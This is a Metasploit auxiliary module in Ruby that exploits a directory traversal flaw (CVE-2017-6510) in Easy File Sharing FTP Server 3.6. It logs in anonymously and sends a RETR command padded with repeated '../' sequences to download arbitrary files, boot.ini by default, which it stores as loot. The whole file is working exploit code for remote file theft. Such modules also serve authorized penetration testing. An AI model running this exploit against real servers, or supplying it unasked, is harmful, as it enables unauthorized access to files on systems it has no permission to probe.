# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Easy File Sharing FTP Server 3.6 Directory Traversal&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a directory traversal vulnerability found in Easy File Sharing FTP Server Version 3.6 and Earlier.
        This vulnerability allows an attacker to download arbitrary files from the server by crafting
        a RETR command that includes file system traversal strings such as &#039;../&#039;
      },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Author&#039;         =>
        [
          &#039;Ahmed Elhady Mohamed&#039;   # @kingasmk ahmed.elhady.mohamed[at]gmail.com
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2017-6510&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 07 2017&#039;
    ))

    register_options(
      [
        OptInt.new(&#039;DEPTH&#039;, [ true, &#039;Traversal Depth (to reach the root folder)&#039;, 32 ]),
        OptString.new(&#039;PATH&#039;, [ true, "Path to the file to disclose, releative to the root dir.", &#039;boot.ini&#039;])
      ], self.class)
  end

  def check_host(ip)
    begin
      connect
      if /Easy File Sharing FTP Server/i === banner
        return Exploit::CheckCode::Detected
      end
    ensure
      disconnect
    end

    Exploit::CheckCode::Safe
  end

  def run_host(target_host)
    begin
      # Login anonymously and open the socket that we&#039;ll use for data retrieval.
      connect_login
      sock = data_connect
      if sock.nil?
        error_msg = &#039;data_connect failed; posssible invalid response&#039;
        print_status(error_msg)
        elog(error_msg)
      else
        file_path = datastore[&#039;PATH&#039;]
        file = ::File.basename(file_path)

        # make RETR request and store server response message...
        retr_cmd = ( "../" * datastore[&#039;DEPTH&#039;] ) + "#{file_path}"
        res = send_cmd( ["RETR", retr_cmd])

        # read the file data from the socket that we opened
        # dont assume theres still a sock to read from. Per #7582
        if sock.nil?
          error_msg = &#039;data_connect failed; posssible invalid response&#039;
          print_status(error_msg)
          elog(error_msg)
          return
        else
          # read the file data from the socket that we opened
          response_data = sock.read(1024)
        end

        unless response_data
          print_error("#{file_path} not found")
          return
        end

        if response_data.length == 0 or ! (res =~ /^150/ )
          print_status("File (#{file_path})from #{peer} is empty...")
          return
        end

        # store file data to loot
        loot_file = store_loot("easy.file.sharing.ftp.data", "text", rhost, response_data, file, file_path)
        vprint_status("Data returned:\n")
        vprint_line(response_data)
        print_good("Stored #{file_path} to #{loot_file}")
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
      vprint_error(e.message)
      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
    rescue ::Timeout::Error, ::Errno::EPIPE => e
      vprint_error(e.message)
      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
    ensure
      data_disconnect
      disconnect
    end
  end
end

